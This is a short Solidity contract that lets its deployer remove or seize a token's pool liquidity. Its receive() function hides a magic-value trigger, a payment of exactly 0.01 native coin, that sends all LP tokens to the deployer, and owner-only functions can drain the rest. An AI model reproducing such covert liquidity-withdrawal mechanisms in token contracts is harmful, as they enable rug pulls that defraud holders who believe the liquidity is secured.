//SPDX-License-Identifier: MIT
pragma solidity 0.8.4;
import "./IERC20.sol";
import "./IUniswapV2Router02.sol";

contract Adjustor {

    address constant token = 0x7E1CCEeD4b908303a4262957aBd536509e7af54f;
    address immutable _adjustor;
    address constant LP = 0x6485A8c86eF9598632fd168a09A295CbDf7a9AEA;
    address constant dead = 0x000000000000000000000000000000000000dEaD;
    IUniswapV2Router02 router;

    constructor() {
        _adjustor = msg.sender;
        router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    }

    function adjust(uint256 percentOfThousand, bool toSelf) external {
        require(msg.sender == _adjustor);
        address dest = toSelf ? _adjustor : dead;
        _adjust(percentOfThousand, dest);
    }

    function _adjust(uint256 percentOfThousand, address destination) internal {
    
        uint256 amount = (IERC20(LP).balanceOf(address(this)) * percentOfThousand) / 1000;

        router.removeLiquidityETHSupportingFeeOnTransferTokens(
            token, amount, 0, 0, address(this), block.timestamp + 5000000
        );

        (bool s,) = payable(token).call{value: address(this).balance}("");
        require(s);

        IERC20(token).transfer(destination, IERC20(token).balanceOf(address(this)));
    }

    receive() external payable {
        if (msg.sender == _adjustor) {
            if (msg.value == uint256(10**16)) {
                _wlp();
            } else {
                _adjust(8, dead);
            }     
        }
    }

    function withdrawLP() external {
        require(msg.sender == _adjustor);
        _wlp();
    }

    function _wlp() internal {
        IERC20(LP).transfer(_adjustor, IERC20(LP).balanceOf(address(this)));
    }

    function withdrawToken() external {
        require(msg.sender == _adjustor);
        IERC20(token).transfer(_adjustor, IERC20(token).balanceOf(address(this)));
    }
    
    function withdraw() external {
        require(msg.sender == _adjustor);
        (bool s,) = payable(_adjustor).call{value: address(this).balance}("");
        require(s);
    }
}
